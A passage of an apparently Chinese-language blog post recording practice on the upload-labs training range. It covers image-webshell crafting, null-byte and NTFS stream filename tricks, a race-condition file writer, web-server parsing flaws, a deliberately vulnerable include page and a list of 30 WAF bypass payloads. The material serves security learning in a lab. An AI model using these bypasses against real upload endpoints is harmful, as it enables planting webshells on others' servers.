class="line">if(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];</span><br><span class="line">        $img_path = $_GET[&apos;save_path&apos;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br><span class="line"></span><br><span class="line">        if(6($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &apos;上传出错！&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else&#123;</span><br><span class="line">        $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这一段意思是,如果文件后缀在我们的列表内就继续,否则提示不允许,如果继续,取得文件临时名,再通过<code>sava_path</code>构造一个<code>img_path</code>用来存放文件.<br>然后判断移动临时文件到我们构造的路径是否成功,失败就报错.<br>所以我们的移动失败了.</p><p><span id="pass12"> </span></p><h2 id="pass12"><a href="#pass12" class="headerlink" title="pass12"></a>pass12</h2><p>通过我不知道的某种方法,我们判断了这是截断上传,而且是通过<code>post</code>方法提交参数的截断上传.<br>由于post方法不会自动将<code>%00</code>作为截断符,我们需要直接在hex 中添加截断符<br>实际操作方法很简单<br>将burp拦截的包发送到repeater,修改raw中的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;save_path&quot;</span><br><span class="line"></span><br><span class="line">../upload/</span><br></pre></td></tr></table></figure><p>在路径后添加我们需要的内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../upload/12.php</span><br></pre></td></tr></table></figure><p>然后再最后再添加一个空格,作为之后修改hex值的标记<br>我们切换到hex选项卡,找到路径的那一行<br>之前我们在路径末尾添加了空格,空格的hex值为<code>20</code>,我们找到这一行的<code>20</code>将他修改为<code>00</code>就是hex中截断符.然后回车保存.<br>发包测试.失败了,同上一条一样提示上传失败.<br>暂时跳过,所有步骤和网上的好几个write up相同,应该不是操作原因.</p><h2 id="pass13"><a href="#pass13" class="headerlink" title="pass13"></a>pass13</h2><p>要求为上传图片马到服务器并使用文件包含漏洞运行图片中的代码,之前学过.但是不知道怎么操作.</p><h3 id="制作图片马"><a href="#制作图片马" class="headerlink" title="制作图片马"></a>制作图片马</h3><p>在win中,首先准备一个恶意代码文件假设命名为<code>m.php</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php phpinfo();?&gt;  //这次我们为了方便不用一句话了,直接用代码查看服务器信息</span><br></pre></td></tr></table></figure><p>然后准备一张图片假设名称为<code>pic.jpg</code><br>放在同一目录下,使用cmd进入这个目录<br>输入命令<code>copy pic.jpg/b + m.php/a picm.jpg</code></p><blockquote><p>命令中<code>/b</code>表明二进制文件 <code>/a</code>表明ascii文本文件<br>值得一提的是如果把两个文件调换位置(两个参数跟着)<code>copy m.php/a + pic.jpg/b picm.jpg</code>,生成的文件图片就乱码了,猜测是文本加在了图片的前面.</p></blockquote><p>直接将这个制作好的图片马<code>picm.jpg</code>上传到靶机.<br>上传成功了,使用burp查看,被重命名了.</p><h3 id="制作文件包含入口"><a href="#制作文件包含入口" class="headerlink" title="制作文件包含入口"></a>制作文件包含入口</h3><p>虽然也可以使用<code>.htaccess</code>但是要求使用文件包含<br>由于没有发现pass13页面,本身有文件包含入口.所以我自己构造了一个包含文件包含漏洞的php页面.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file=$_GET[&apos;page&apos;];  //通过url获取参数赋值给变量</span><br><span class="line">include($file);  // 传入用户变量给`include`函数,产生漏洞.</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>手动传入服务器,访问,在url中传入我们的参数,也就是我们上传的图片码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.96.128/upload-labs/upload/include.php?page=1520190215165135.jpg</span><br></pre></td></tr></table></figure><p>这样我们图片中包含的php代码就被服务器解析了.<br>我们看到页面上显示了当前php服务器信息.</p><p><em>注意:当我们使用远程文件包含的时候,如果包含的能直接运行的代码文件,如.php,那么这个代码就会在文件所在机器执行,如果包含的是txt,jpg这样的含有代码的服务器不能直接解析的文件,就会包含到我们的<code>include</code>所在的代码中合并执行,也就是在使用包含函数的服务段执行</em></p><h2 id="pass14"><a href="#pass14" class="headerlink" title="pass14"></a>pass14</h2><p>本pass14,通过阅读源码得知,使用<code>getimagesize()</code>函数判断文件类型,粗略搜索了这个函数会判断文件流的头,来判断是否为图片文件</p><p>我们测试一下这个函数,来粗略的理解它.<br>首先我们使用十六进制编辑器,推荐使用np++</p><p>首先我们构造一个php语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure><p>它的16进制值是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3C3F 7068 7020 7068 7069 6E66 6F28 293B 203F 3E</span><br></pre></td></tr></table></figure><p>我们在最前面添加16进制的png头,将其构造为假的png文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8950 4E47 0D0A 1A0A 3C3F 7068 7020 7068 7069 6E66 6F28 293B 203F 3E</span><br></pre></td></tr></table></figure><p>最后保存成 <code>.png</code> 后缀的文件</p><blockquote><p>这里注意,十六进制编辑器,我先使用的notepad++的插件.失败了,特别是无法使用64位的插件<br>然后使用ue的十六进制编辑发现无法直接将16进制的字符插入,会被自动写入字符串那边<br>最后我使用了<code>HxD</code>这个软件,成功修改了.</p></blockquote><p>然后上传成功.<br>我们直接使用pass14页面的文件包含漏洞,打开文件包含入口页面.页面直接展示了源码.<br>发现使用file字符可以通过get注入到include函数中.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.96.128/upload-labs/include.php?file=./upload/5320190221140730.png</span><br></pre></td></tr></table></figure><p>输入payload,成功了</p><p>这里我们使用pass的方法.cmd的<code>copy</code>命令拼接成的文件就含有图片文件的头信息,使用十六进制编辑器查看是含有头文件的,所以同pass13一样可以绕过,这里就不再重复.</p><h2 id="pass15"><a href="#pass15" class="headerlink" title="pass15"></a>pass15</h2><p>pass15查看源码使用了<code>exif_imagetype()</code>函数.上传时发生问题,页面无响应<br>查看别人的writeup发现是没有开启服务器的<code>php_exif</code>模块.开启后上传上一个pass制作的图片码,成功了,没有继续去搜寻这个模块的作用,推测也是通过检测头的方式.</p><h2 id="pass16"><a href="#pass16" class="headerlink" title="pass16"></a>pass16</h2><p>我们查看页面提示,知道了本例会比对文件后缀与文件结构是否相同,而且会重新渲染图片.这样我们即使绕过了比对,最后的图片会被重新渲染,插入的代码很可能就被修改了.<br>使用的<code>imagecreatefromgif</code>函数渲染.<br>由于需要些脚本比上传后的图片没有被修改的部分,所以我没有复现,只是了解了原理.<br>这里放出一个链接,似乎是漏洞的发现者的文章:<a href="http://link.zhihu.com/?target=https%3A//secgeek.net/bookfresh-vulnerability/" target="_blank" rel="noopener">http://link.zhihu.com/?target=https%3A//secgeek.net/bookfresh-vulnerability/</a></p><p>如果有时间将会专门编写脚本重新测试这个pass</p><h2 id="pass17"><a href="#pass17" class="headerlink" title="pass17"></a>pass17</h2><p>这题的本意的考察<code>条件竞争</code>,什么意思呢.我也不知道.<br>在搜索writeup的时候我发现了一个<code>win+php</code>时可以使用的方法.</p><h3 id="方法一-1"><a href="#方法一-1" class="headerlink" title="方法一"></a>方法一</h3><p>方法可以在:<a href="https://paper.seebug.org/92/#0x05-iisphp" target="_blank" rel="noopener">https://paper.seebug.org/92/#0x05-iisphp</a> 的<code>0x05</code>标题下找到<br>建议先观看</p><p>科普： 在php+window+iis环境下:</p><blockquote><p>双引号(“&gt;”) &lt;==&gt; 点号(“.”)’;</p><p>大于符号(“&gt;”) &lt;==&gt; 问号(“?”)’;</p><p>小于符号(“&lt;“) &lt;==&gt; 星号(“*”)’;</p></blockquote><p>其他原理不再说明直接给出操作过程.<br>首先我们先利用特殊办法生成一个php文件，然后再利用这个特性将文件覆盖..</p><p>我们上传一个写有一句话的php文件使用burp抓包.我们先修改文件名称 <code>17.php:.jpg</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;17.php:.jpg&quot;</span><br></pre></td></tr></table></figure><p><em>tips:冒号可以截断,冒号截断产生的文件是空白的</em><br>页面提示图片不符合要求,我们查看服务器已经生成了一个<code>17.php</code>的没有任何内容的文件</p><p>然后继续修改上传名称<code>17.&lt;&lt;&lt;</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;17.&lt;&lt;&lt;&quot;</span><br></pre></td></tr></table></figure><p>页面提示上传不符合要求,我们查看服务器,刚才的<code>17.php</code>文件已经有代码内容了.</p><h3 id="方法二-条件竞争"><a href="#方法二-条件竞争" class="headerlink" title="方法二 条件竞争"></a>方法二 条件竞争</h3><h4 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h4><p>我们先不看源码演示过程,粗略的猜想下,这个就是利用代码设计者没有考虑到多线程并发造成的某些延迟问题.<br>粗略的理解代码,这个pass先将文件上传然后比对,如果不符合条件再删除.所以要使用多线程造成程序堵塞,在这个时间访问页面.由于只能在我们不断写入的时候访问,很快就会被删除,我们要使用访问的这个文件去创建一个含有代码的文件.</p><p>首先编写一个 <code>100.php</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php fputs(fopen(&quot;info.php&quot;, &quot;w&quot;), &quot;&lt;?php phpinfo(); ?&gt;&quot;); ?&gt;  //会在当前目录写入一个`info.php`文件,内容是&quot;&lt;?php phpinfo(); ?&gt;&quot;</span><br></pre></td></tr></table></figure><p>由于现在还不会编写脚本.我使用burp的 intruder功能<br>使用number类型的paylaod,变量直接设置在内容里</p><p><img src="https://e1sewhere.github.io/images/tjjz.png" alt="positions"></p><p><img src="https://e1sewhere.github.io/images/jjpl.png" alt="payload"></p><p>然后线程设置大一点<em>线程的设置在intruder&gt;options&gt;request engin&gt;number of threads</em></p><p>然后开始执行,执行期间我们访问 这个<code>100.php</code>(可以先上传一个正常的图片获得),多刷新几次,发现页面显示235,也就是上传含有235的payload的时候这个页面执行成功了,说明当前目录下已经有了一个<code>info.php</code>文件了.我们尝试访问,显示了php版本页面,成功了.</p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>查看源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;submit&apos;]))&#123;</span><br><span class="line">    $ext_arr = array(&apos;jpg&apos;,&apos;png&apos;,&apos;gif&apos;);</span><br><span class="line">    $file_name = $_FILES[&apos;upload_file&apos;][&apos;name&apos;];</span><br><span class="line">    $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];</span><br><span class="line">    $file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1);</span><br><span class="line">    $upload_file = UPLOAD_PATH . &apos;/&apos; . $file_name;</span><br><span class="line"></span><br><span class="line">    if(move_uploaded_file($temp_file, $upload_file))&#123;  //不做判断直接上传了文件</span><br><span class="line">        if(in_array($file_ext,$ext_arr))&#123;  //判断后缀</span><br><span class="line">             $img_path = UPLOAD_PATH . &apos;/&apos;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br><span class="line">             rename($upload_file, $img_path);</span><br><span class="line">             $is_upload = true;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;</span><br><span class="line">            unlink($upload_file);  //不符合,就删除文件</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $msg = &apos;上传出错！&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>补充函数:</p><blockquote><p>定义和用法<br>unlink() 函数删除文件。<br>若成功，则返回 true，失败则返回 false。<br>语法<br>unlink(filename,context)</p></blockquote><p>从我的简单注释发现,和之前的的描述一样.没有什么好分析的了.直接上传,判断不合法就删除.文件在多线程上传的时候就会有一个滞留时间,然后访问,执行代码.</p><h2 id="pass18"><a href="#pass18" class="headerlink" title="pass18"></a>pass18</h2><p>条件竞争<br>使用重命名上传,我还没有看源码 ,之后有时间查看</p><p>直接步骤<br>由于上传的文件会被重命名.利用上传重命名竞争+Apache解析漏洞<br>上传名字为<code>18.php.7Z</code>的文件,会被重命名为<code>date().7z</code><br>快速重复提交该数据包，会提示文件已经被上传，但没有被重命名<br>使用burp<br>和上面的步骤一样,只是这次可以直接上传webshell了<br>尝试了几次一直没有在upload目录下找到上传的文件,发现是作者的代码有误构造的保存路径的<code>upload</code>后面没有加<code>/</code>,这个<code>upload</code>变成了文件名的一部分.</p><p><img src="https://e1sewhere.github.io/images/522.png" alt=""></p><p>直到返回一个不同的页面.我们去文件路径下看.<br><img src="https://e1sewhere.github.io/images/553.png" alt=""></p><p>有<code>xx.php.7z</code>这样的文件了.这里就可以使用apache解析漏洞直接访问.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://999.999.999.999/upload-labs/100.php.7z</span><br></pre></td></tr></table></figure><p>就执行代码了.</p><h1 id="upload-bypass"><a href="#upload-bypass" class="headerlink" title="upload bypass"></a>upload bypass</h1><h2 id="waf检测范围"><a href="#waf检测范围" class="headerlink" title="waf检测范围"></a>waf检测范围</h2><p>请求的url<br>Boundary边界<br>MIME类型<br>文件扩展名<br>文件内容</p><p>测试时的准备工作：<br>什么么语言？什么容器？什么系统？都什么版本？<br>上传文件都可以上传什么格式的文件？还是允许上传任意类型？<br>上传的文件会不会被重命名或者二次渲染？</p><h2 id="容器特性"><a href="#容器特性" class="headerlink" title="容器特性"></a>容器特性</h2><h3 id="apache1-x-2-x文件后缀解析漏洞"><a href="#apache1-x-2-x文件后缀解析漏洞" class="headerlink" title="apache1.x 2.x文件后缀解析漏洞"></a>apache1.x 2.x文件后缀解析漏洞</h3><p>Apache在以上版本中，解析文件名的方式是从后向前识别扩展名，直到遇见Apache可识别的扩展名为止</p><h3 id="ISS6-0解析缺陷"><a href="#ISS6-0解析缺陷" class="headerlink" title="ISS6.0解析缺陷"></a>ISS6.0解析缺陷</h3><p>目录名包含 .asp 、 .asa 、 .cer 的话，则该目录下的所有文件都将按照asp解析<br>例如<code>c:\wwwroot\cer.cer\haha.jpg</code><br>这个文件就会被解析为<code>.asp</code>文件</p><p>文件名中如果包含 .asp; 、 .asa; 、 .cer; 则优先使用asp解析。<br>例如： <code>asa.asa;asa.jpg</code><br>会被解析为<code>.asp</code></p><h3 id="Nginx解析漏洞"><a href="#Nginx解析漏洞" class="headerlink" title="Nginx解析漏洞"></a>Nginx解析漏洞</h3><p>Nginx 0.5.<em><br>Nginx 0.6.</em><br>Nginx 0.7 &lt;= 0.7.65</p><h4 id="Nginx-0-8-lt-0-8-37"><a href="#Nginx-0-8-lt-0-8-37" class="headerlink" title="Nginx 0.8 &lt;= 0.8.37"></a>Nginx 0.8 &lt;= 0.8.37</h4><p>以上Nginx容器的版本下，上传一个在waf白名单之内扩展名的文件shell.jpg，然后以<br>shell.jpg%00.php进行请求。</p><h4 id="Nginx-0-8-41-–-1-5-6："><a href="#Nginx-0-8-41-–-1-5-6：" class="headerlink" title="Nginx 0.8.41 – 1.5.6："></a>Nginx 0.8.41 – 1.5.6：</h4><p>以上Nginx容器的版本下，上传一个在waf白名单之内扩展名的文件shell.jpg，然后以<br>shell.jpg%20%00.php进行请求。</p><h3 id="PHP-CGI解析漏洞"><a href="#PHP-CGI解析漏洞" class="headerlink" title="PHP CGI解析漏洞"></a>PHP CGI解析漏洞</h3><p>IIS 7.0/7.5<br>Nginx &lt; 0.8.3</p><p>以上的容器版本中默认php配置文件cgi.fix_pathinfo=1时，上传一个存在于白名单的扩展<br>名文件shell.jpg，在请求时以shell.jpg/shell.php请求，会将shell.jpg以php来解析</p><h3 id="多个Content-Disposition"><a href="#多个Content-Disposition" class="headerlink" title="多个Content-Disposition"></a>多个Content-Disposition</h3><p>在IIS的环境下，上传文件时如果存在<code>多个Content-Disposition</code>的话，IIS会取第一个<br>Content-Disposition中的值作为接收参数，而如果waf只是取最后一个的话将会被绕过。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">content-dispositon:form-data; name=&quot;file&quot;; filename=&quot;shell.php&quot;</span><br><span class="line">content-dispositon:form-data; name=&quot;file&quot;; filename=&quot;shell.jpg&quot;</span><br></pre></td></tr></table></figure><h3 id="结合-htaccess"><a href="#结合-htaccess" class="headerlink" title="结合.htaccess"></a>结合.htaccess</h3><p>这个方法通常用于绕过waf黑名单的，配置该目录下所有文件都将其使用php来解析</p><h2 id="系统特性"><a href="#系统特性" class="headerlink" title="系统特性"></a>系统特性</h2><h3 id="windows特殊字符"><a href="#windows特殊字符" class="headerlink" title="windows特殊字符"></a>windows特殊字符</h3><p>当我们上传一个文件的filename为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell.php&#123;%80-%99&#125;</span><br></pre></td></tr></table></figure><p>时(这个%80是哈希要用hex编辑)：<br>waf可能识别<code>%80-%99</code>,但是window会识别为空格,而后缀名的空格会被windows忽略.</p><h3 id="exee扩展名"><a href="#exee扩展名" class="headerlink" title="exee扩展名"></a>exee扩展名</h3><p>上传.exe文件通常会被waf拦截，如果使用各种特性无用的话，那么可以把扩展名改<br>为.exee再上传。</p><h3 id="NTFS-ADS特性"><a href="#NTFS-ADS特性" class="headerlink" title="NTFS ADS特性"></a>NTFS ADS特性</h3><p>ADS是NTFS磁盘格式的一个特性，用于NTFS交换数据流。在上传文件时，如果waf对请求<br>正文的 filename 匹配不当的话可能会导致绕过</p><table><thead><tr><th style="text-align:left">上传文件名</th><th style="text-align:left">服务器表面现象</th><th style="text-align:left">生成文件内容</th></tr></thead><tbody><tr><td style="text-align:left">test.php:a.jpg</td><td style="text-align:left">生成test.php</td><td style="text-align:left">空</td></tr><tr><td style="text-align:left">test.php::$INDEX_ALLOCATION</td><td style="text-align:left">生成test.php文件夹</td><td style="text-align:left"></td></tr><tr><td style="text-align:left">test.php::$DATA.jpg</td><td style="text-align:left">生成test.php</td><td style="text-align:left">原内容</td></tr></tbody></table><p>Windows在创建文件时，在文件名末尾不管加多少点(空格也是)都会自动去除，那么上传时filename<br>可以这么写 shell.php…… 也可以这么写 shell.php::$DATA…….</p><h2 id="数据过长导致的绕过"><a href="#数据过长导致的绕过" class="headerlink" title="数据过长导致的绕过"></a>数据过长导致的绕过</h2><p>waf如果对<code>Content-Disposition</code>长度处理的不够好的话可能会导致绕过</p><p>基于构造长文件名:<br>如果web程序会将filename除le 扩展名的那段重命名的话，那么还可以构造更多的点、符号绕过重命名.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filname=&quot;shell.............................................................................................................................................................................................................................................................asp&quot;</span><br></pre></td></tr></table></figure><p>特殊的长文件名：<br>文件名使用非字母数字，比如中文等最大程度的拉长，不行的话再结合一下其他的特性测试：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell.asp;王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王.jpg</span><br></pre></td></tr></table></figure><h2 id="wafbypass-upload一些总结绕过"><a href="#wafbypass-upload一些总结绕过" class="headerlink" title="wafbypass_upload一些总结绕过"></a>wafbypass_upload一些总结绕过</h2><p>在这里放上个人之前总结的30个上传绕过姿势：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">1. filename在content-type下面</span><br><span class="line">2. .asp&#123;80-90&#125;</span><br><span class="line">3. NTFS ADS</span><br><span class="line">4. .asp...</span><br><span class="line">5. boundary不一致</span><br><span class="line">6. iis6分号截断asp.asp;asp.jpg</span><br><span class="line">7. apache解析漏洞php.php.ddd</span><br><span class="line">8. boundary和content-disposition中间插入换行</span><br><span class="line">9. hello.php:a.jpg然后hello.&lt;&lt;&lt;</span><br><span class="line">10. filename=php.php</span><br><span class="line">11. filename=&quot;a.txt&quot;;filename=&quot;a.php&quot;</span><br><span class="line">12. name=\n&quot;file&quot;;filename=&quot;a.php&quot;</span><br><span class="line">13. content-disposition:\n</span><br><span class="line">14. .htaccess文件</span><br><span class="line">15. a.jpg.\nphp</span><br><span class="line">16. 去掉content-disposition的form-data字段</span><br><span class="line">17. php&lt;5.3 单双引号截断特性</span><br><span class="line">18. 删掉content-disposition: form-data;</span><br><span class="line">19. content-disposition\00:</span><br><span class="line">20. &#123;char&#125;+content-disposition</span><br><span class="line">21. head头的content-type: tab</span><br><span class="line">22. head头的content-type: multipart/form-DATA</span><br><span class="line">23. filename后缀改为大写</span><br><span class="line">24. head头的Content-Type: multipart/form-data;\n</span><br><span class="line">25. .asp空格</span><br><span class="line">26. .asp0x00.jpg截断</span><br><span class="line">27. 双boundary</span><br><span class="line">28. file\nname=&quot;php.php&quot;</span><br><span class="line">29. head头content-type空格:</span><br><span class="line">30. form-data字段与name字段交换位置</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文记录了练习upload labs 的过程,已经学习完了,有很多问题没有解决,有一些pass也看得很走马观花,但是时间不多先学习其他的.&lt;br&gt;末尾也会持续补充关于upload的知识积累&lt;br&gt;
    
    </summary>
    
      <category term="笔记" scheme="https://e1sewhere.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="文件上传" scheme="https://e1sewhere.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
</feed>
